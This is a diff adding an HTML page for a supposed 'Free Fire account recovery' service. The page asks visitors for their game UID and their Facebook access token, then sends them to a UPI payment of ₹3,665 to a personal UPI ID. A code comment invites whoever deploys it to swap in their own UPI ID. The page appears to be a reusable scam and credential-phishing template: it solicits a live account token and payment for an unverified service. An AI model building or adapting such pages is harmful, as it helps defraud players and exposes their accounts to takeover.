@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium FF Recovery Store</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Poppins:wght@300;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --neon-purple: #bc13fe;
+            --dark-bg: #0d0221;
+            --accent-cyan: #0ff;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--dark-bg);
+            background-image: radial-gradient(circle at 50% 50%, #240046 0%, #0d0221 100%);
+            color: white;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Animated Background */
+        body::before {
+            content: "";
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: url('https://www.transparenttextures.com/patterns/stardust.png');
+            animation: moveBg 50s linear infinite;
+            opacity: 0.3;
+            z-index: -1;
+        }
+
+        @keyframes moveBg {
+            from { transform: translate(0,0); }
+            to { transform: translate(-50%, -50%); }
+        }
+
+        .product-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            width: 90%;
+            max-width: 450px;
+            padding: 30px;
+            border-radius: 20px;
+            border: 1px solid rgba(188, 19, 254, 0.3);
+            box-shadow: 0 0 20px rgba(188, 19, 254, 0.2);
+            text-align: center;
+            animation: fadeIn 1s ease-out;
+        }
+
+        .ff-logo {
+            width: 70px;
+            filter: drop-shadow(0 0 10px var(--neon-purple));
+            margin-bottom: 10px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 20px;
+            color: var(--neon-purple);
+            text-shadow: 0 0 10px var(--neon-purple);
+            margin: 5px 0;
+        }
+
+        /* Input Styles */
+        .input-group {
+            margin: 15px 0;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            font-size: 12px;
+            color: var(--accent-cyan);
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--neon-purple);
+            border-radius: 8px;
+            color: white;
+            font-family: 'Poppins', sans-serif;
+            outline: none;
+            box-sizing: border-box;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            box-shadow: 0 0 10px var(--neon-purple);
+            background: rgba(188, 19, 254, 0.1);
+        }
+
+        .price-tag {
+            font-size: 30px;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+
+        .price-tag span {
+            font-size: 16px;
+            color: #666;
+            text-decoration: line-through;
+        }
+
+        .buy-btn {
+            background: var(--neon-purple);
+            color: white;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            font-size: 18px;
+            font-family: 'Orbitron', sans-serif;
+            border-radius: 10px;
+            cursor: pointer;
+            box-shadow: 0 0 15px var(--neon-purple);
+            transition: 0.3s;
+        }
+
+        .buy-btn:hover {
+            box-shadow: 0 0 25px var(--neon-purple);
+            transform: scale(1.02);
+        }
+
+        .footer-tools {
+            margin-top: 25px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .payment-icons img {
+            height: 20px;
+            margin: 0 8px;
+        }
+
+        .terms-btn {
+            background: transparent;
+            border: 1px solid rgba(255,255,255,0.2);
+            color: #aaa;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 11px;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="product-card">
+    <img src="https://img.icons8.com/color/96/free-fire.png" class="ff-logo" alt="FF">
+    
+    <h1>ACCOUNT RECOVERY</h1>
+    <p style="color: var(--accent-cyan); font-size: 12px; margin-bottom: 20px;">AISWAL ENTERPRISES SECURE PORTAL</p>
+
+    <div class="input-group">
+        <label>Free Fire UID</label>
+        <input type="text" id="playerUid" placeholder="Enter your 10-digit UID" maxlength="12">
+    </div>
+
+    <div class="input-group">
+        <label>Facebook Access Token</label>
+        <input type="text" id="fbToken" placeholder="Paste your FB token here">
+    </div>
+
+    <div class="price-tag">
+        <span>₹4,999</span> ₹3,665
+    </div>
+
+    <button class="buy-btn" onclick="payViaUPI()">PAY NOW</button>
+
+    <div class="footer-tools">
+        <div class="payment-icons">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/Razorpay_logo.svg" alt="Razorpay">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="UPI">
+        </div>
+        <a href="#" class="terms-btn">Terms & Conditions</a>
+    </div>
+</div>
+
+<script>
+    function payViaUPI() {
+        const uid = document.getElementById('playerUid').value;
+        const token = document.getElementById('fbToken').value;
+
+        if(!uid || !token) {
+            alert("Please fill in both UID and Facebook Token to proceed.");
+            return;
+        }
+
+        // Configuration
+        const upiId = "sharmaanu8957@oksbi"; // EDIT THIS TO YOUR UPI ID
+        const amount = "3665";
+        const name = "Aiswal Enterprises";
+        const note = `FF-Recovery-UID-${uid}`;
+
+        // UPI Deep Link
+        const upiUrl = `upi://pay?pa=${upiId}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tn=${encodeURIComponent(note)}`;
+
+        window.location.href = upiUrl;
+
+        setTimeout(() => {
+            alert("Redirecting to UPI Apps (PhonePe/GPay/FamPay)... If you are on PC, please use a mobile phone.");
+        }, 500);
+    }
+</script>
+
+</body>
+</html>
